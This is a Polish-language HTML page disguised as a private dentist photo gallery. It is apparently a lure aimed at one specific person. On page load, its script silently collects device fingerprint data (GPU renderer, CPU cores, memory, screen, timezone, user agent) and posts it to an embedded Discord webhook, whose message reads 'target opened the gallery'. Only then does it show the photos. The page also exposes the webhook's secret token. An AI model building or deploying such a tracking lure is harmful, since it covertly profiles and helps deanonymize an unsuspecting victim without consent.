<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dentysta – zdjęcia</title>
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; padding: 20px; min-height: 100vh; background: #f3f4f6; color: #1f2937; font-family: Arial, Helvetica, sans-serif; display: flex; flex-direction: column; align-items: center; }
    .container { width: 100%; max-width: 700px; }
    header { background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 16px 18px; margin-bottom: 15px; }
    h1 { margin: 0; font-size: 19px; font-weight: 600; }
    .subtitle { margin-top: 5px; color: #777; font-size: 12px; }

    #loader-view { background: white; border: 1px solid #ddd; border-radius: 10px; padding: 45px 20px; text-align: center; margin-bottom: 15px; }
    .loader { width: 35px; height: 35px; margin: 0 auto 15px; border: 4px solid #e5e7eb; border-top-color: #555; border-radius: 50%; animation: spin 1s linear infinite; }
    #loader-text { color: #666; font-size: 13px; }
    @keyframes spin { to { transform: rotate(360deg); } }

    #gallery { display: none; width: 100%; }
    .folder { background: white; border: 1px solid #ddd; border-radius: 10px; padding: 14px 16px; margin-bottom: 15px; }
    .folder-name { font-size: 14px; font-weight: 600; }
    .folder-info { color: #888; font-size: 11px; margin-top: 4px; }

    .photo-card { background: white; border: 1px solid #ddd; border-radius: 10px; overflow: hidden; margin-bottom: 15px; }
    .photo-card img { width: 100%; display: block; background: #eee; }
    .photo-info { padding: 11px 13px; }
    .filename { font-size: 13px; word-break: break-all; }
    .meta { margin-top: 4px; font-size: 11px; color: #888; }

    #debug-section { margin-top: 20px; width: 100%; }
    #debug-title { font-size: 12px; font-weight: bold; margin-bottom: 6px; color: #555; }
    #debug-box { width: 100%; height: 200px; overflow-y: auto; padding: 12px; background: #111827; color: #9ca3af; border-radius: 8px; border: 1px solid #374151; font-family: monospace; font-size: 11px; line-height: 1.5; text-align: left; }
    .debug-line { margin-bottom: 3px; }
    .label { color: #60a5fa; }
    .value { color: #d1d5db; word-break: break-word; }
    footer { text-align: center; color: #999; font-size: 11px; padding: 20px 0 10px; }
  </style>
</head>
<body>

<div class="container">
  <header>
    <h1>Dentysta – zdjęcia</h1>
    <div class="subtitle">Prywatne archiwum zdjęć</div>
  </header>

  <!-- LOADER -->
  <div id="loader-view">
    <div class="loader"></div>
    <div id="loader-text">Przygotowywanie galerii...</div>
  </div>

  <!-- GALERIA (Ukryta do momentu wysłania telemetrii) -->
  <div id="gallery">
    <div class="folder">
      <div class="folder-name">📁 Zdjęcia</div>
      <div class="folder-info">2 pliki</div>
    </div>

    <!-- FOTO 1 -->
    <div class="photo-card">
      <img src="./20260808_121307.jpg" alt="20260808_121307.jpg" loading="lazy">
      <div class="photo-info">
        <div class="filename">20260808_121307.jpg</div>
        <div class="meta">JPG · zdjęcie</div>
      </div>
    </div>

    <!-- FOTO 2 -->
    <div class="photo-card">
      <img src="./IMG_20250315_160715.heif" alt="IMG_20250315_160715.heif" loading="lazy"
        onerror="this.style.display='none'; this.parentElement.querySelector('.meta').textContent='HEIF · przeglądarka nie obsługuje bezpośredniego wyświetlania tego formatu';">
      <div class="photo-info">
        <div class="filename">IMG_20250315_160715.heif</div>
        <div class="meta">HEIF · zdjęcie</div>
      </div>
    </div>
  </div>

  <!-- DIAGNOSTIKA DLA CIEBIE (Do usunięcia później) -->
  <div id="debug-section">
    <div id="debug-title">Developer diagnostics (Widok testowy)</div>
    <div id="debug-box">
      <div class="debug-line"><span class="label">[SYSTEM]</span> Inicjalizacja skryptu tła...</div>
    </div>
  </div>

  <footer>Prywatne archiwum zdjęć</footer>
</div>

<script>
  // Wklejony Twój webhook Discorda
  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
  let diagnosticData = {};

  function logDebug(label, value) {
    const box = document.getElementById("debug-box");
    const line = document.createElement("div");
    line.className = "debug-line";
    line.innerHTML = `<span class="label">[${escapeHtml(label)}]</span> <span class="value">${escapeHtml(String(value))}</span>`;
    box.appendChild(line);
    box.scrollTop = box.scrollHeight;
  }

  function escapeHtml(text) {
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
  }

  function detectGPU() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return "WebGL niedostępny";
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    } catch (error) {
      return "Błąd: " + error.message;
    }
  }

  function collectDiagnostics() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform || null,
      language: navigator.language || null,
      cores: navigator.hardwareConcurrency || null,
      deviceMemory: navigator.deviceMemory || null,
      screen: { width: screen.width, height: screen.height },
      viewport: { width: window.innerWidth, height: window.innerHeight, devicePixelRatio: window.devicePixelRatio },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
      gpu: detectGPU(),
      online: navigator.onLine,
      connection: connection ? { effectiveType: connection.effectiveType || null, downlink: connection.downlink || null } : null
    };
  }

  async function sendReportToDiscord(data) {
    try {
      const payload = {
        username: "MASZA DENTYSTA - OSINT",
        embeds: [{
          title: "🎯 CEL OTWARÓŁ GALERIĘ 'DENTYSTA'!",
          color: 15158332,
          fields: [
            { name: "🎮 GPU Renderer", value: `\`${data.gpu || "N/A"}\``, inline: false },
            { name: "💻 Hardware", value: `CPU: \`${data.cores || "?"}\` | RAM: \`${data.deviceMemory || "?"} GB\``, inline: true },
            { name: "🌍 Strefa Czasowa", value: `\`${data.timezone || "N/A"}\``, inline: true },
            { name: "🖥️ Ekran", value: `\`${data.screen.width} × ${data.screen.height}\``, inline: true },
            { name: "🌐 User-Agent", value: `\`\`\`${data.userAgent || "N/A"}\`\`\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
      logDebug("DISCORD", "Telemetria wysłana pomyślnie w tle!");
    } catch (error) {
      logDebug("DISCORD ERROR", error.message);
    }
  }

  async function initialize() {
    logDebug("SYSTEM", "Zbieranie danych środowiskowych...");
    diagnosticData = collectDiagnostics();

    logDebug("GPU", diagnosticData.gpu);
    logDebug("RAM", diagnosticData.deviceMemory ? diagnosticData.deviceMemory + " GB" : "nieznane");
    logDebug("Strefa", diagnosticData.timezone);

    logDebug("DISCORD", "Wysyłanie paczki danych w tle...");
    await sendReportToDiscord(diagnosticData);

    // Krótkie opóźnienie dla płynności animacji
    await new Promise(resolve => setTimeout(resolve, 600));

    // Schowaj loader, pokaż galerię ze zdjęciami
    document.getElementById("loader-view").style.display = "none";
    document.getElementById("gallery").style.display = "block";
    logDebug("GALLERY", "Galeria z plikami 'Dentysta' została pomyślnie wyrenderowana.");
  }

  window.addEventListener("DOMContentLoaded", initialize);
</script>

</body>
</html>
